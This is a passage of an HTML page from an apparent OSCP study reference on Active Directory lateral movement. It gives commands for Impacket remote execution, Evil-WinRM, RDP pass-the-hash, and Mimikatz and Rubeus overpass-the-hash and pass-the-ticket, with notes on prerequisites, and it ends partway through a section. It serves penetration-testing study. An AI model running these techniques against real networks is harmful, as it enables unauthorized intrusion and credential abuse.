@@ -1,0 +1,619 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Lateral Movement."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/05-lateral-movement/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Lateral Movement | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Lateral Movement."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/05-lateral-movement/"><title>Lateral Movement | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#1-choose-by-credential-and-service">1. Choose by credential and service</a></li><li class="level-2"><a href="#2-preflight-from-the-actual-source">2. Preflight from the actual source</a></li><li class="level-2"><a href="#3-validate-authentication-separately-from-execution">3. Validate authentication separately from execution</a></li><li class="level-2"><a href="#4-smb-and-service-control-execution">4. SMB and service-control execution</a></li><li class="level-3"><a href="#impacket-psexec">Impacket PsExec</a></li><li class="level-3"><a href="#sysinternals-psexec-from-windows">Sysinternals PsExec from Windows</a></li><li class="level-3"><a href="#smbexec">SMBExec</a></li><li class="level-3"><a href="#atexec">ATExec</a></li><li class="level-2"><a href="#5-wmi-and-dcom-execution">5. WMI and DCOM execution</a></li><li class="level-3"><a href="#impacket-wmiexec">Impacket WMIExec</a></li><li class="level-3"><a href="#native-powershell-cim-over-dcom">Native PowerShell CIM over DCOM</a></li><li class="level-3"><a href="#dcom-mmc-method">DCOM MMC method</a></li><li class="level-2"><a href="#6-winrm-winrs-and-powershell-remoting">6. WinRM, WinRS and PowerShell remoting</a></li><li class="level-3"><a href="#evil-winrm">Evil-WinRM</a></li><li class="level-3"><a href="#native-winrs">Native WinRS</a></li><li class="level-3"><a href="#powershell-remoting">PowerShell remoting</a></li><li class="level-2"><a href="#7-rdp">7. RDP</a></li><li class="level-2"><a href="#8-pass-the-hash-overpass-the-hash-and-pass-the-ticket">8. Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket</a></li><li class="level-3"><a href="#pass-the-hash">Pass-the-Hash</a></li><li class="level-3"><a href="#overpass-the-hash--key-to-ticket">Overpass-the-Hash / key-to-ticket</a></li><li class="level-3"><a href="#pass-the-ticket">Pass-the-Ticket</a></li><li class="level-2"><a href="#9-local-versus-domain-identity-and-remote-uac">9. Local versus domain identity and remote UAC</a></li><li class="level-2"><a href="#10-output-channels-session-0-and-double-hop">10. Output channels, session 0 and double hop</a></li><li class="level-2"><a href="#11-failure-router">11. Failure router</a></li><li class="level-2"><a href="#12-after-movement">12. After movement</a></li><li class="level-2"><a href="#tooling-for-this-section">Tooling for this section</a></li><li class="level-2"><a href="#winexe--samba-side-service-execution-alternative">winexe — Samba-side service execution alternative</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="lateral-movement">Lateral Movement</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/README.md">← Stage index</a> | <a href="/tools/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Identity transitions</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/07-pivoting-tunneling/README.md">Pivoting</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/active-directory.md">AD cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/lateral-movement.md">Move to another host</a></p>
+<blockquote>
+<p><strong>Selection rule:</strong> credential type → accepted authentication protocol → reachable service → service-specific authorization → execution/session effect.</p>
+<p><strong>Exit:</strong> verify the destination hostname, represented identity, token/rights and network state; then re-enumerate credentials, domain relationships, sessions and routes.</p>
+</blockquote>
+<h2 id="1-choose-by-credential-and-service">1. Choose by credential and service</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Material</th><th>Compatible starting paths</th><th>Important boundary</th></tr></thead><tbody><tr><td>Password</td><td>SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP</td><td>Correct password does not grant the required logon or execution right</td></tr><tr><td>NT hash</td><td>NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported</td><td>Net-NTLM and DCC2 are not reusable NT hashes</td></tr><tr><td>TGT/ccache</td><td>Kerberos-capable tool using target FQDN/SPN</td><td>Ticket identity, realm, lifetime, DNS and KDC route must match</td></tr><tr><td>TGS</td><td>Only the named <code>SERVICE/HOST</code> and compatible client</td><td>A CIFS ticket does not authorize WinRM, WMI or RDP</td></tr><tr><td>AES/NT long-term key</td><td>Request a TGT, then use Kerberos</td><td>RC4/NT-key requests can fail where RC4 is disabled</td></tr><tr><td>Local-account password/hash</td><td>NTLM or RDP in the target's local account context</td><td>Remote UAC/account restrictions commonly filter non-RID-500 local administrators</td></tr></tbody></table>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Reachable service</th><th>Common execution/access mechanisms</th><th>Usual authorization</th></tr></thead><tbody><tr><td>SMB 445 + SCM/RPC</td><td>PsExec, SMBExec, service creation</td><td>Administrative share plus SCM/service rights</td></tr><tr><td>RPC endpoint mapper 135 + dynamic RPC; often SMB for output</td><td>WMIExec, native CIM/WMI, DCOM</td><td>Remote WMI/DCOM rights, commonly an effective administrator token</td></tr><tr><td>Task Scheduler RPC plus SMB output</td><td>ATExec</td><td>Remote task creation and administrative output access</td></tr><tr><td>WinRM 5985/5986</td><td>WinRS, PowerShell remoting, Evil-WinRM</td><td>Enabled endpoint and endpoint/session authorization</td></tr><tr><td>RDP 3389</td><td>FreeRDP, MSTSC</td><td>Remote-interactive logon right; Restricted Admin requires administrator access</td></tr></tbody></table>
+<h2 id="2-preflight-from-the-actual-source">2. Preflight from the actual source</h2>
+<p>Directly routed source:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt
+getent hosts TARGET_HOST
+date -u
+</code></pre>
+<p>Windows source:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Resolve-DnsName TARGET_HOST
+Test-NetConnection TARGET_HOST -Port 445
+Test-NetConnection TARGET_HOST -Port 5985
+Test-NetConnection TARGET_HOST -Port 3389
+w32tm /query /status
+</code></pre>
+<p>Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits.</p>
+<p>Record:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT
+-> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT
+-> CHOSEN METHOD -> EXPECTED EFFECT
+</code></pre>
+<h2 id="3-validate-authentication-separately-from-execution">3. Validate authentication separately from execution</h2>
+<p>NetExec can classify a selected SMB credential:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Domain password
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
+
+# Domain NT hash
+nxc smb TARGET -d DOMAIN -u USER -H NT_HASH
+
+# Target-local account
+nxc smb TARGET -u Administrator -H NT_HASH --local-auth
+
+# Prove only share access
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
+</code></pre>
+<blockquote>
+<p>A successful login proves SMB authentication. <code>(Pwn3d!)</code> is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed.</p>
+</blockquote>
+<p>For one justified execution proof:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname &#x26; whoami" --exec-method wmiexec
+</code></pre>
+<p>Current NetExec can select <code>wmiexec</code>, <code>atexec</code> or <code>smbexec</code>; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable.</p>
+<h2 id="4-smb-and-service-control-execution">4. SMB and service-control execution</h2>
+<h3 id="impacket-psexec">Impacket PsExec</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Password
+impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'
+
+# NT hash / Pass-the-Hash
+impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+</code></pre>
+<blockquote>
+<p><strong>Need:</strong> SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM.</p>
+</blockquote>
+<p>Kerberos cache:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME="$PWD/USER.ccache"
+impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
+</code></pre>
+<p>The target parameter uses the hostname matching the CIFS/HOST SPN; <code>-target-ip</code> separates connection routing from Kerberos naming.</p>
+<h3 id="sysinternals-psexec-from-windows">Sysinternals PsExec from Windows</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe
+</code></pre>
+<blockquote>
+<p>The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable.</p>
+</blockquote>
+<h3 id="smbexec">SMBExec</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET'
+impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+</code></pre>
+<blockquote>
+<p>SMBExec creates temporary services whose command lines redirect output through a share. It does not use the same uploaded RemCom binary as PsExec, but it still requires SCM/service rights and produces substantial service/event artifacts.</p>
+</blockquote>
+<details>
+<summary><strong>Kerberos and alternate output modes</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME="$PWD/USER.ccache"
+impacket-smbexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
+
+# SHARE is default; SERVER starts a local SMB server and needs permission to bind locally.
+impacket-smbexec -mode SHARE -share C$ 'DOMAIN/USER:PASSWORD@TARGET'
+</code></pre>
+</details>
+<h3 id="atexec">ATExec</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname &#x26; whoami"
+impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname &#x26; whoami"
+</code></pre>
+<blockquote>
+<p>ATExec creates and deletes a scheduled task and normally retrieves output from <code>ADMIN$\Temp</code>. It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work.</p>
+</blockquote>
+<p>Kerberos:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME="$PWD/USER.ccache"
+impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname &#x26; whoami"
+</code></pre>
+<h2 id="5-wmi-and-dcom-execution">5. WMI and DCOM execution</h2>
+<h3 id="impacket-wmiexec">Impacket WMIExec</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET'
+impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+</code></pre>
+<blockquote>
+<p>WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to <code>ADMIN$</code>; therefore a WMI process may run even when output retrieval fails. <code>-nooutput</code> or <code>-silentcommand</code> changes that evidence channel.</p>
+</blockquote>
+<p>Kerberos with separate name and route:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME="$PWD/USER.ccache"
+impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
+</code></pre>
+<details>
+<summary><strong>One command, no SMB output</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt"
+</code></pre>
+<p>Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.</p>
+</details>
+<h3 id="native-powershell-cim-over-dcom">Native PowerShell CIM over DCOM</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$Credential = Get-Credential 'DOMAIN\USER'
+$Options = New-CimSessionOption -Protocol Dcom
+$Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+  CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt'
+}
+
+Remove-CimSession $Session
+</code></pre>
+<blockquote>
+<p><code>ReturnValue = 0</code> and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop.</p>
+</blockquote>
+<h3 id="dcom-mmc-method">DCOM MMC method</h3>
+<p>Current Windows token:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST')
+$Object = [Activator]::CreateInstance($Type)
+$Object.Document.ActiveView.ExecuteShellCommand(
+  'cmd.exe',
+  $null,
+  '/c hostname > C:\Windows\Temp\movement-proof.txt',
+  '7'
+)
+</code></pre>
+<p>Impacket with password or NT hash:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET'
+impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+</code></pre>
+<blockquote>
+<p>Current Impacket <code>dcomexec</code> explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use <code>wmiexec -k</code> when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary.</p>
+</blockquote>
+<h2 id="6-winrm-winrs-and-powershell-remoting">6. WinRM, WinRS and PowerShell remoting</h2>
+<h3 id="evil-winrm">Evil-WinRM</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Password; omit -p to prompt where supported
+evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD'
+
+# NT hash
+evil-winrm -i TARGET_HOST -u USER -H NT_HASH
+
+# HTTPS listener
+evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986
+</code></pre>
+<p>Current Evil-WinRM ticket-file support:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP
+</code></pre>
+<blockquote>
+<p><strong>Need:</strong> reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket.</p>
+</blockquote>
+<h3 id="native-winrs">Native WinRS</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname &#x26; whoami"
+</code></pre>
+<p>To avoid retaining a password on the command line, use the current authorized Windows credential context where possible:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">winrs /r:TARGET_HOST "cmd /c hostname &#x26; whoami"
+</code></pre>
+<blockquote>
+<p>WinRS uses WinRM. A non-administrator can require <code>/noprofile</code> depending on endpoint configuration. <code>/allowdelegate</code> affects onward credential use and is not a default fix for the double-hop problem.</p>
+</blockquote>
+<h3 id="powershell-remoting">PowerShell remoting</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Test-WSMan TARGET_HOST
+$Credential = Get-Credential 'DOMAIN\USER'
+
+Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock {
+  hostname
+  whoami /all
+}
+
+$Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential
+Enter-PSSession -Session $Session
+</code></pre>
+<blockquote>
+<p>A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes.</p>
+</blockquote>
+<h2 id="7-rdp">7. RDP</h2>
+<p>Check the installed binary name:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">command -v xfreerdp3 || command -v xfreerdp
+</code></pre>
+<p>Password:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
+</code></pre>
+<p>Older packages may expose the same syntax through <code>xfreerdp</code>.</p>
+<p>NT hash:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution
+</code></pre>
+<blockquote>
+<p>FreeRDP's <code>/pth</code> uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override.</p>
+</blockquote>
+<p>Native client:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">mstsc.exe /v:TARGET_HOST
+mstsc.exe /restrictedAdmin /v:TARGET_HOST
+</code></pre>
+<p>Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately.</p>
+<h2 id="8-pass-the-hash-overpass-the-hash-and-pass-the-ticket">8. Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket</h2>
+<h3 id="pass-the-hash">Pass-the-Hash</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE
+</code></pre>
+<p>PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization.</p>
+<h3 id="overpass-the-hash--key-to-ticket">Overpass-the-Hash / key-to-ticket</h3>
+<p>Mimikatz network-credential context:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe
+</code></pre>
+<p>Rubeus TGT request:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
+klist
+</code></pre>
+<p>AES alternative:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt
+</code></pre>
+<p>Trigger a Kerberos service request with the hostname, then inspect:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">dir \\TARGET_HOST\C$
+klist
+</code></pre>
+<blockquote>
+<p>In a Mimikatz <code>sekurlsa::pth</code> process, <code>whoami</code> can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local <code>whoami</code> as the network identity.</p>
+</blockquote>
+<h3 id="pass-the-ticket">Pass-the-Ticket</h3>
+<p>Windows:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe ptt /ticket:ticket.kirbi
+klist
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">kerberos::ptt ticket.kirbi
+</code></pre>
+<p>Linux:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME="$PWD/ticket.ccache"
+klist
+impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
+</code></pre>
+<p>A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect.</p>
+<h2 id="9-local-versus-domain-identity-and-remote-uac">9. Local versus domain identity and remote UAC</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">DOMAIN\USER  -> domain identity; evaluate target-local group/right
+TARGET\USER  -> SAM identity on that target
